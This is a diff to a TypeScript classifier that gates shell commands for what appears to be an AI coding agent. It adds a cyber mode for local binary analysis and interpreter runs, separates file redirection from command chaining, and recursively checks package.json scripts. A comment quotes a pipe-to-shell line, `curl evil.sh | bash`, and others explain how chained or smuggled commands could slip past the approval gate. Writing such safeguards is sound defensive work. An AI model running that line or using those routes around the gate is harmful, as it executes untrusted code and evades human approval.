+ * `a > b | sh`, not a plain write.
+ */
+function isRedirectionOnly(command: string): boolean {
+  if (!REDIRECT_OPERATOR.test(command)) return false
+  // Test the WHOLE command for composition rather than stripping operators and
+  // inspecting the remainder. Stripping is the obvious approach and it is
+  // wrong: a redirect *target* may legally contain the characters being
+  // stripped, so `strings x > out.txt && curl evil.sh | bash` could be made to
+  // look clean and would carry a pipe-to-shell into an auto-allowed write.
+  // Here `&&` and `|` are present in the original, so it is refused.
+  if (SHELL_COMPOSITION.test(command)) return false
+  // `eval`/`exec`/`source` run text rather than redirect bytes, and SHELL_CONTROL_SYNTAX
+  // matched them; they stay composed even with no operator present.
+  if (/\b(?:eval|exec|source)\b/i.test(command)) return false
+  return true
+}
+
+/**
+ * Local, offline analysis tools and interpreter script runs, for cyber mode.
+ *
+ * Split in two because they are different risks. The tools read a file and
+ * print to stdout — `strings`, `objdump`, `file`, `xxd` — and are a
+ * non-executing look at a binary. The interpreters run code the operator (or
+ * the run itself, via write_file) put on this machine; that is arbitrary
+ * local execution, and it is the point of a solve loop, but it is honestly a
+ * different class from reading bytes.
+ *
+ * Both are start-anchored on a bare program word, so an argument cannot smuggle
+ * a second command in front of the classification, and control syntax has
+ * already been refused upstream.
+ */
+const CYBER_ANALYSIS_TOOL = /^(?:\S+=\S+\s+)*(?:command\s+)?(?:strings|objdump|objcopy|readelf|nm|size|file|xxd|hexdump|od|hexdump|strings|checksec|readelf|rabin2|r2|radare2|ghidra|ghidraRun|binwalk|pwndbg|gdb|ltrace|strace|upx|patchelf|diffoscope|foremost|steghide|exiftool|openssl\s+(?:dgst|sha\d+|enc)|certutil|xxd|hd)\b/i
+const CYBER_INTERPRETER_RUN = /^(?:\S+=\S+\s+)*(?:command\s+)?(?:python3?|py(?:\.exe)?|node|bun|deno|ruby|perl|php|lua|bash|sh|zsh|python3?\s+-c|node\s+-e)\b(?!\s+(?:-m\s+)?(?:pip3?|npm|yarn|pnpm|apt(?:-get)?|brew|install)\b)/i
+
+function isCyberSolveCommand(command: string): boolean {
+  return CYBER_ANALYSIS_TOOL.test(command) || CYBER_INTERPRETER_RUN.test(command)
+}
+
+function assessCommand(command: string, cwd: string, context?: CommandContext): ActionAssessment {
   if (!command.trim()) return assessment('critical', 'approve', 'shell command is empty or invalid', 'shell', [], false)
   // CR/LF anywhere means a chain or a pasted script, not one verified
   // invocation, and is rejected before any other gate can run. A harmless
   // lead-in ("echo ok\nbash /tmp/p.sh") must never ride a start-anchored
   // read-only match past the rest of this classifier.
   if (SHELL_CONTROL_SYNTAX.test(command)) {
+    // Split the "one program, one file" redirection from real composition
+    // before the composed gate fires, so cyber mode can write without also
+    // opening the pipe-to-shell path. Anything carrying `;`, `&`, `|`, a
+    // backtick, `$(`, or a newline is composition and stays refused there.
+    if (isRedirectionOnly(command)) {
+      return assessment('critical', 'approve', 'shell command redirects to or from a file', 'shell.redirect', [], false)
+    }
     return assessment('critical', 'approve', 'shell control syntax or interpreter evaluation requires an exact approval boundary', 'shell.composed', [], false)
   }
   if (commandMayReadSensitiveData(command)) {
     return assessment('critical', 'approve', 'shell command may read credentials or protected system data', 'shell.sensitive-read', [], false)
   }
-  if (SYSINTEL_RECORD_MENTION.test(command) && !PLAIN_READ_COMMAND.test(command)) {
+  if ((SYSINTEL_RECORD_MENTION.test(command) || SYSINTEL_RECORD_MENTION.test(unquoteShellText(command))) && !PLAIN_READ_COMMAND.test(command)) {
     return assessment('critical', 'approve', `shell command may modify the System Intelligence record (${SYSINTEL_RECORD_DIR}), which is written only through the si_* tools`, 'sysintel.record-edit', [], false)
   }
   // The named hazard intents are checked BEFORE the generic CRITICAL_COMMAND
@@ -1271,7 +1615,7 @@ function assessCommand(command: string, _cwd: string): ActionAssessment {
   // Supply-chain installs, container/SSH execution are critical with a
   // dedicated intent — they execute arbitrary code, so no unattended run may
   // auto-allow them, and no settled sibling may ever cover commander.
-  if (CODE_EXEC_COMMAND.test(command)) {
+  if (CODE_EXEC_COMMAND.test(command) || INTERPRETER_PACKAGE_INSTALL_COMMAND.test(command) || (activeMode() === 'cyber' && CYBER_PACKAGE_INSTALL_COMMAND.test(command))) {
     return assessment('critical', 'approve', 'shell command installs packages whose build scripts can execute arbitrary code on the host', 'shell.code-exec', [], false)
   }
   if (REMOTE_SHELL_COMMAND.test(command)) {
@@ -1280,19 +1624,58 @@ function assessCommand(command: string, _cwd: string): ActionAssessment {
   if (CRITICAL_COMMAND.test(command)) {
     return assessment('critical', 'approve', 'shell command may cause an irreversible or external side effect', 'shell', [], false)
   }
+  // Placed AFTER every hazard intent above on purpose: exfil, remote fetch,
+  // supply-chain install, remote shell, and the broad CRITICAL_COMMAND match
+  // all keep precedence. Only a command that would otherwise have fallen
+  // through to REVIEW_COMMAND / READ_ONLY_COMMAND / the shell.unknown
+  // catch-all reaches here, so this widens what a cyber run may do without
+  // reclassifying a single one of the commands the gates above exist for.
+  if (activeMode() === 'cyber' && isCyberSolveCommand(command)) {
+    return assessment('critical', 'approve', 'shell command runs a local analysis tool or interpreter script for cyber work', 'shell.solve', [], false)
+  }
   if (REVIEW_COMMAND.test(command) || isLocalGitStaging(command)) {
     return assessment('review', 'approve', 'shell command changes dependencies, reaches a remote system, or creates a durable artifact', 'shell', [], true)
   }
   if (/^(?:command\s+)?git\s+branch\b/i.test(command) && !GIT_BRANCH_LIST_ONLY.test(command)) {
     return assessment('critical', 'approve', 'git branch command may create, delete, rename, or force-move a branch and is not a safe read-only operation', 'shell.unknown', [], false)
   }
-  if (READ_ONLY_COMMAND.test(command) && !SED_AWK_INPLACE_EDIT.test(command) && !DESTRUCTIVE_SHELL_VERBS.test(command)) {
+  if (READ_ONLY_COMMAND.test(command) && !SED_AWK_INPLACE_EDIT.test(command) && !DESTRUCTIVE_SHELL_VERBS.test(command) && !readOnlyCommandRunsCode(command)) {
     return assessment('safe', 'allow', 'shell command matches the restricted read-only command policy', 'shell.read-only', [], !SHELL_SIDE_EFFECT.test(command))
   }
   if (isWorkspaceMkdir(command)) {
     return assessment('review', 'approve', 'mkdir creates directories under the directory it runs in', 'shell', [], true)
   }
+  const invocation = context ? context.invocation?.() : shellInvocation(command, undefined, cwd)
+  const local = invocation && assessLocalProgram(invocation, cwd, context ?? {})
+  if (local) return local
   return assessment('critical', 'approve', 'shell command is not in the restricted read-only policy and may cause an unreviewed side effect', 'shell.unknown', [], false)
+}
+
+/**
+ * The project's own program, run inside the workspace, is local review work —
+ * the same band as a commit — so an autonomous session runs it unasked and an
+ * unattended run may too (localProgram.ts says what qualifies). A package.json
+ * script is only as local as what it runs: its body, and the `pre`/`post`
+ * hooks the manager runs with it, go back through this classifier, and one
+ * critical line keeps the whole script where it was (`shell.unknown`).
+ */
+function assessLocalProgram(invocation: ProgramInvocation, cwd: string, context: CommandContext): ActionAssessment | undefined {
+  const program = localProgram(invocation, cwd, { planning: context.planning })
+  if (!program) return undefined
+  if (program.kind === 'file') {
+    return assessment('review', 'approve', `runs ${program.path}, the project's own program inside the workspace`, 'shell.local-program', [program.path], true)
+  }
+  const depth = context.depth ?? 0
+  for (const body of program.bodies) {
+    const inner = depth < MAX_SCRIPT_DEPTH
+      ? assessCommand(body.command, cwd, { invocation: () => body.argv && { argv: body.argv, cwd: invocation.cwd }, planning: context.planning, depth: depth + 1 })
+      : undefined
+    if (!inner || inner.risk === 'critical') {
+      const why = inner ? inner.reason : `it nests scripts more than ${MAX_SCRIPT_DEPTH} deep`
+      return assessment('critical', 'approve', `the "${program.name}" script in ${program.manifest} runs \`${body.command}\`, and ${why}`, 'shell.unknown', [], false)
+    }
+  }
+  return assessment('review', 'approve', `runs the "${program.name}" script from ${program.manifest}, which only runs the project's own programs or allowed checks`, 'shell.local-program', [program.manifest], true)
 }
 
 /**
